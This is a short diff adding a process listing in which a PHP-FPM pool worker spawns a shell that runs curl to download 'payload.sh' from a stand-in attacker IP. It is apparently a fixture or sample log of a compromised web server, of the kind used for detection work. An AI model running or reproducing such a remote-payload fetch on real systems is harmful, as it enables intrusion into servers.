@@ -1,0 +1,4 @@
+  PID  PPID COMMAND         ARGS
+ 1001     1 php-fpm8.1      php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
+ 1022  1001 php-fpm8.1      php-fpm: pool www
+ 1988  1022 sh              /bin/sh -c curl http://198.51.100.42/payload.sh
